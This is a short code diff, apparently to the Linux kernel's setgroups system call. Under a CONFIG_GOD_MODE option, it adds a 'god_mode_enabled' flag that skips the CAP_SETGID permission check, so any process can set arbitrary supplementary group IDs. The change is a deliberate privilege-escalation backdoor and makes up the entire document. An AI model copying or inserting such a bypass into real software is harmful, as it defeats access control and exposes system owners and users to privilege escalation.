@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Supplementary group IDs
  */
@@ -234,7 +237,15 @@ SYSCALL_DEFINE2(setgroups, int, gidsetsize, gid_t __user *, grouplist)
 	int retval;
 
 	if (!nsown_capable(CAP_SETGID))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if ((unsigned)gidsetsize > NGROUPS_MAX)
 		return -EINVAL;
 
